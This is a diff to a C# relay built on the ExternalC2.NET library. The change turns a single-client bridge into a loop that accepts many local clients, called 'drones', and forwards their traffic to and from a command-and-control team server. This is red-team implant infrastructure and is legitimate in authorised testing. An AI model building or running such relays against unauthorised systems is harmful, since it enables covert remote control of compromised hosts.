@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading.Tasks;
 
 using ExternalC2.NET.Server;
@@ -21,48 +20,42 @@ internal static class Program
         var target = IPAddress.Parse(args[0]);
         var port = int.Parse(args[1]);
 
-        // connect to the team server
-        var controller = new ServerController(target, port);
-        if (!await controller.Connect())
-        {
-            Console.WriteLine($"Failed to connect to {target}:{port}.");
-            return;
-        }
-
         // wait for a connection from a client
         var listener = new TcpListener(IPAddress.Loopback, 9999);
         listener.Start(100);
 
-        var client = await listener.AcceptTcpClientAsync();
-        
-        // stop the listener
-        listener.Stop();
-        
-        // read pipename from client
-        var pipename = Encoding.Default.GetString(await client.ReadData());
-        
-        // request payload
-        var payload = await controller.RequestPayload(pipename);
-        
-        // send it to the client
-        await client.WriteData(payload);
+        while (true)
+        {
+            // block until a client connects
+            var client = await listener.AcceptTcpClientAsync();
+            
+            // handle each client in its own task
+            var controller = new ServerController(target, port);
+            _ = Task.Run(async () => await HandleClient(controller, client));
+        }
+    }
 
-        // drop into loop
+    private static async Task HandleClient(ServerController controller, TcpClient client)
+    {
+        controller.OnDataFromTeamServer += async delegate(byte[] data)
+        {
+            // send any data received from the team server to the client
+            await client.WriteData(data);
+        };
+
+        // run the controller
+        _ = controller.Start();
+        
+        // read from the client
         while (client.Connected)
         {
-            if (client.HasData())
+            // this is upstream from the drone
+            if (client.DataAvailable())
             {
-                // read from client
-                var inbound = await client.ReadData();
+                var upstream = await client.ReadData();
                 
-                // send it to team server
-                await controller.SendData(inbound);
-                
-                // read data from team server
-                var outbound = await controller.ReadData();
-                
-                // send it to the client
-                await client.WriteData(outbound);
+                // give it to the controller
+                await controller.SendData(upstream);
             }
 
             await Task.Delay(100);
